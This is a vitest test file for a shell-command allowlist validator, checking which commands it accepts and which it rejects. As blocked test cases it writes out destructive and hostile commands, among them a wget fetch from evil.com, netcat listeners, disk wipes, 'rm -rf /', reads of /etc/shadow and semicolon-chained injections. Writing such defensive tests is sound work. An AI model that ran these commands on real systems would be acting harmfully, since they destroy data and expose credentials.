import { describe, it, expect } from 'vitest';
import { validateCommand } from '../src/allowlist.js';

describe('allowlist validator', () => {
  describe('allowed commands', () => {
    it.each([
      'git pull origin develop',
      'git status',
      'docker build -t myapp .',
      'docker stop container1',
      'docker-compose up -d',
      'sudo docker stop container1',
      'sudo docker build -t foo .',
      'curl https://example.com',
      'python3 script.py',
      'bash /local/data/run.sh',
      'sh -c "echo hello"',
      'npm install',
      'node server.js',
    ])('allows: %s', (cmd) => {
      expect(validateCommand(cmd)).toEqual({ valid: true });
    });
  });

  describe('blocked binaries', () => {
    it.each([
      ['shutdown -h now', 'shutdown'],
      ['reboot', 'reboot'],
      ['iptables -F', 'iptables'],
      ['dd if=/dev/zero of=/dev/sda', 'dd'],
      ['mkfs.ext4 /dev/sda1', 'mkfs'],
      ['wget http://evil.com/payload', 'wget'],
      ['nc -l 4444', 'nc'],
      ['ncat -l 4444', 'ncat'],
      ['rm -rf /', 'rm'],
      ['rm file.txt', 'rm'],
    ])('blocks: %s', (cmd, _bin) => {
      const result = validateCommand(cmd);
      expect(result.valid).toBe(false);
      expect(result.reason).toBeDefined();
    });
  });

  describe('unknown binaries', () => {
    it('blocks unknown binary', () => {
      const result = validateCommand('somebinary --flag');
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('not in allowlist');
    });
  });

  describe('sudo validation', () => {
    it('blocks sudo with disallowed sub-command', () => {
      const result = validateCommand('sudo rm -rf /');
      expect(result.valid).toBe(false);
    });

    it('blocks sudo shutdown', () => {
      const result = validateCommand('sudo shutdown -h now');
      expect(result.valid).toBe(false);
    });
  });

  describe('blocked patterns', () => {
    it('blocks writes outside /local/data/', () => {
      const result = validateCommand('echo bad > /etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('/local/data/');
    });

    it('allows writes inside /local/data/', () => {
      const result = validateCommand('echo ok > /local/data/test.txt');
      expect(result).toEqual({ valid: true });
    });

    it('blocks /dev/ access', () => {
      const result = validateCommand('cat /dev/sda');
      expect(result.valid).toBe(false);
    });

    it('blocks /etc/ access', () => {
      const result = validateCommand('cat /etc/shadow');
      expect(result.valid).toBe(false);
    });
  });

  describe('command chaining', () => {
    it('blocks injection via semicolon', () => {
      const result = validateCommand('git pull; rm -rf /');
      expect(result.valid).toBe(false);
    });

    it('blocks piped destructive commands', () => {
      const result = validateCommand('echo test | rm -rf /');
      expect(result.valid).toBe(false);
    });

    it('blocks && chained destructive commands', () => {
      const result = validateCommand('git pull && shutdown -h now');
      expect(result.valid).toBe(false);
    });

    it('blocks || chained destructive commands', () => {
      const result = validateCommand('git pull || reboot');
      expect(result.valid).toBe(false);
    });

    it('allows safe chained commands', () => {
      const result = validateCommand('git pull && docker build -t app .');
      expect(result).toEqual({ valid: true });
    });
  });
});
